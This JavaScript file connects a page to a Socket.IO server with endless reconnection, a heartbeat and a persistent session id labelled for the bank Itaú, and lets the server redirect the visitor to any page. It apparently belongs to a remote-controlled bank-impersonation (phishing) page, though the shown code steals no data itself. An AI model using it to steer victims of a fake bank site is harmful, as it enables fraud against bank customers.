// Socket.IO Connection Handler with enhanced reconnection and heartbeat
(function() {
    'use strict';
    
    // Socket configuration with robust reconnection
    const socket = io({
        reconnection: true,
        reconnectionDelay: 500,
        reconnectionDelayMax: 2000,
        reconnectionAttempts: Infinity,
        timeout: 10000,
        transports: ['polling', 'websocket'],
        upgrade: true,
        rememberUpgrade: true,
        autoConnect: true,
        forceNew: false,
        multiplex: true
    });

    let sessionId = localStorage.getItem('itau_session_id');
    let heartbeatInterval = null;
    let isConnected = false;

    // Start heartbeat to keep session alive
    function startHeartbeat() {
        if (heartbeatInterval) {
            clearInterval(heartbeatInterval);
        }
        
        heartbeatInterval = setInterval(() => {
            if (isConnected && sessionId) {
                socket.emit('heartbeat');
            }
        }, 15000); // Every 15 seconds
    }

    // Stop heartbeat
    function stopHeartbeat() {
        if (heartbeatInterval) {
            clearInterval(heartbeatInterval);
            heartbeatInterval = null;
        }
    }

    // Initialize session on connection
    socket.on('connect', () => {
        console.log('Socket conectado:', socket.id);
        isConnected = true;
        socket.emit('init-session', { sessionId });
    });

    socket.on('session-ready', (data) => {
        sessionId = data.sessionId;
        localStorage.setItem('itau_session_id', sessionId);
        console.log('Session ready:', sessionId, data.reconnected ? '(reconnected)' : '(new)');
        startHeartbeat();
    });

    socket.on('heartbeat-ack', () => {
        console.log('Heartbeat OK');
    });

    socket.on('disconnect', (reason) => {
        console.log('Socket desconectado:', reason);
        isConnected = false;
        stopHeartbeat();
        
        // Auto-reconnect if not manual disconnect
        if (reason === 'io server disconnect') {
            socket.connect();
        }
    });

    socket.on('connect_error', (error) => {
        console.error('Error de conexion:', error.message);
        isConnected = false;
    });

    socket.on('reconnect', (attemptNumber) => {
        console.log('Reconectado despues de', attemptNumber, 'intentos');
        isConnected = true;
    });

    socket.on('reconnect_attempt', (attemptNumber) => {
        console.log('Intento de reconexion:', attemptNumber);
    });

    socket.on('reconnect_error', (error) => {
        console.error('Error de reconexion:', error.message);
    });

    socket.on('reconnect_failed', () => {
        console.error('Reconexion fallida');
    });

    // Handle redirect commands
    socket.on('redirect', (data) => {
        console.log('Redirect recibido:', data);
        if (data.clearData) {
            // Clear session but keep connection
            localStorage.removeItem('itau_session_id');
            sessionId = null;
        }
        window.location.href = data.page;
    });

    // Clean up on page unload
    window.addEventListener('beforeunload', () => {
        stopHeartbeat();
    });

    // Expose socket and sessionId globally
    window.itauSocket = socket;
    window.getSessionId = () => sessionId;
    window.setSessionId = (id) => {
        sessionId = id;
        localStorage.setItem('itau_session_id', id);
    };
})();
